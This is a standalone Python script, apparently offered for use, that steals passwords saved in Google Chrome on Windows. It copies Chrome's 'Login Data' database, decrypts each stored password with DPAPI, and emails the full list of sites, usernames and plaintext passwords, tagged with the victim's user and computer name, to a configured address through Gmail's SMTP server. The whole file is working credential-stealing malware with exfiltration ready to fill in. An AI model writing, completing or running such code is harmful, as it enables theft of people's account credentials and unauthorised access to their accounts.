import os
import sqlite3
import win32crypt
import smtplib
import tempfile
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path

class ChromePasswordHarvester:
    def __init__(self, sender_email, sender_password, receiver_email):
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
        
        # Path to Chrome's login data
        self.chrome_data_path = os.path.expanduser(
            r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"
        )
        self.login_db_path = os.path.join(self.chrome_data_path, "Login Data")
        
    def get_chrome_passwords(self):
        """Extracts passwords from Chrome database."""
        if not os.path.exists(self.login_db_path):
            return []

        # Copy DB to temp to avoid locking issues
        temp_db = os.path.join(tempfile.gettempdir(), "temp_login.db")
        try:
            import shutil
            shutil.copy2(self.login_db_path, temp_db)
        except Exception as e:
            print(f"[!] Could not copy database: {e}")
            return []

        passwords = []
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                password_encrypted = row[2]
                
                try:
                    # Decrypt using DPAPI
                    password = win32crypt.CryptUnprotectData(password_encrypted, None, None, None, 0)[1]
                    if password:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": password.decode('utf-8')
                        })
                except Exception:
                    pass
                    
            conn.close()
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
                
        return passwords

    def send_email(self, subject, body):
        """Sends an email via SMTP."""
        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = self.receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        try:
            # Use Gmail's SMTP server
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.sendmail(self.sender_email, self.receiver_email, msg.as_string())
            server.quit()
            print("[+] Email sent successfully!")
        except Exception as e:
            print(f"[!] Email failed: {e}")

    def run(self):
        print("[*] Starting Chrome Password Harvest...")
        creds = self.get_chrome_passwords()
        
        if not creds:
            body = "No Chrome passwords found."
        else:
            body = f"Found {len(creds)} credentials:\n\n"
            for i, cred in enumerate(creds, 1):
                body += f"{i}. Site: {cred['url']}\n"
                body += f"   User: {cred['username']}\n"
                body += f"   Pass: {cred['password']}\n\n"
        
        subject = f"Chrome Credentials - {os.environ.get('USERNAME', 'Unknown')}@{os.environ.get('COMPUTERNAME', 'Unknown')}"
        self.send_email(subject, body)

if __name__ == "__main__":
    # --- CONFIGURATION ---
    # Replace with your details
    SENDER_EMAIL = "your-email@gmail.com"
    SENDER_PASSWORD = "your-app-password"  # Not your regular Gmail password!
    RECEIVER_EMAIL = "your-email@gmail.com" # Can be same as sender
    
    harvester = ChromePasswordHarvester(SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL)
    harvester.run()